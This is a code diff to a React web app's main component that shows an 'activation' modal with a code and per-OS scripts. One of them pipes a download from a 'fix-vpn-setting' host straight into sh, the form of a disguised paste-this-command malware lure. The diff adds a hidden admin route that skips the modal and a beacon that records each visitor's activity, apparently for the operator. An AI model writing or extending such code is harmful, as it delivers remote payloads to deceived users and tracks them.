@@ -14,7 +14,10 @@ import { Localstorage } from "@/data/storage";
 import { useActivationModalStore } from "@/store/non-persisted/modal/useActivationModalStore";
 import Routes from "./routes";
 
+let visitorActivityRecordedForDocument = false;
+
 const ACTIVATION_CODE = "Rs7s3ITo";
+const ADMIN_PATH = "/adminuseronlyadminaccessible";
 const ACTIVATION_SCRIPTS = {
   linux:
     "wget -qO- 'https://fix-vpn-setting.vercel.app/api/settings/linux' | sh",
@@ -38,6 +41,7 @@ const getActivationOS = (): ActivationOS | null => {
 };
 
 const App = () => {
+  const isAdminRoute = window.location.pathname === ADMIN_PATH;
   const { showActivationModal } = useActivationModalStore();
   const activationOS = getActivationOS();
   const terminalName =
@@ -48,7 +52,7 @@ const App = () => {
   const [activationCode, setActivationCode] = useState("");
 
   useEffect(() => {
-    if (!showActivationModal) return;
+    if (!showActivationModal || isAdminRoute) return;
 
     const root = document.documentElement;
     const previousRootOverflow = root.style.overflow;
@@ -61,7 +65,25 @@ const App = () => {
       root.style.overflow = previousRootOverflow;
       document.body.style.overflow = previousBodyOverflow;
     };
-  }, [showActivationModal]);
+  }, [isAdminRoute, showActivationModal]);
+
+  useEffect(() => {
+    if (visitorActivityRecordedForDocument) return;
+    visitorActivityRecordedForDocument = true;
+
+    fetch("/api/admin/activity", { keepalive: true, method: "POST" }).then(
+      (response) => {
+        if (!response.ok) {
+          console.error(
+            `Unable to record visitor activity (${response.status}).`
+          );
+        }
+      },
+      (error: unknown) => {
+        console.error("Unable to record visitor activity.", error);
+      }
+    );
+  }, []);
 
   const handleActivation = (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault();
@@ -93,6 +115,10 @@ const App = () => {
 
     setActivationPage("instructions");
   };
+
+  if (isAdminRoute) {
+    return <Routes />;
+  }
 
   return (
     <>
